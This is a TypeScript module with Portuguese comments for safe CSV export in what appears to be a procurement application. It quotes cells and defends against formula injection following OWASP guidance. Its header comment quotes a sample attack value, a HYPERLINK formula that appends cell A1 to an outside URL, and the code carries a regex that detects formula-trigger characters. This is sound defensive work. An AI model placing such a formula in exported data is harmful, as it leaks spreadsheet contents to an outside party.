/**
 * Célula de CSV segura para abrir em planilha.
 *
 * Aspas duplicadas e célula entre aspas resolvem o delimitador e a quebra de linha — mas não
 * a INJEÇÃO DE FÓRMULA: o Excel/LibreOffice interpretam como fórmula qualquer célula que
 * comece com `=`, `+`, `-` ou `@` (e TAB/CR, que alguns leitores descartam antes de olhar o
 * primeiro caractere), mesmo entre aspas. Nome de insumo, descrição de item e justificativa
 * vêm de usuário ou de sistema externo (CATMAT, NF-e); um `=HYPERLINK("https://…?"&A1)`
 * cadastrado ali executava na máquina de quem abriu a exportação.
 *
 * Defesa padrão (OWASP): prefixar `'` — a planilha mostra o texto como texto. Número de
 * verdade é isento: `-3.5` não é fórmula, e prefixá-lo quebraria a coluna numérica.
 */

const FORMULA_TRIGGER = /^[=+\-@\t\r]/
/** Número puro (com sinal e decimal opcionais) — não há fórmula possível aí. */
const PLAIN_NUMBER = /^[+-]?\d+(?:[.,]\d+)?$/

export type CsvValue = string | number | null | undefined

/** Uma célula: sempre entre aspas, aspas internas duplicadas, fórmula neutralizada. */
export function csvCell(value: CsvValue): string {
	if (value == null) return '""'
	if (typeof value === "number") return Number.isFinite(value) ? `"${value}"` : '""'
	const text = FORMULA_TRIGGER.test(value) && !PLAIN_NUMBER.test(value) ? `'${value}` : value
	return `"${text.replaceAll('"', '""')}"`
}

/** Uma linha: células escapadas e unidas pelo delimitador (`,` por padrão; SIAFI usa `;`). */
export function csvRow(values: readonly CsvValue[], delimiter = ","): string {
	return values.map(csvCell).join(delimiter)
}

/**
 * Documento CSV inteiro: cabeçalho + linhas, com BOM UTF-8 na frente — sem ele o Excel abre o
 * arquivo como Latin-1 e "Preparação" vira "PreparaÃ§Ã£o".
 */
export function csvDocument(header: readonly string[], rows: readonly (readonly CsvValue[])[], delimiter = ","): string {
	return `﻿${[header, ...rows].map((row) => csvRow(row, delimiter)).join("\n")}`
}

/**
 * Baixa o CSV no navegador como `nome_AAAA-MM-DD.csv`. A data é a LOCAL: `toISOString` daria o
 * dia seguinte para quem exporta depois das 21h em Brasília.
 */
export function downloadCsv(baseName: string, content: string): void {
	const blob = new Blob([content], { type: "text/csv;charset=utf-8;" })
	const url = URL.createObjectURL(blob)
	const link = document.createElement("a")
	link.href = url
	link.download = `${baseName}_${new Date().toLocaleDateString("sv-SE")}.csv`
	link.click()
	URL.revokeObjectURL(url)
}
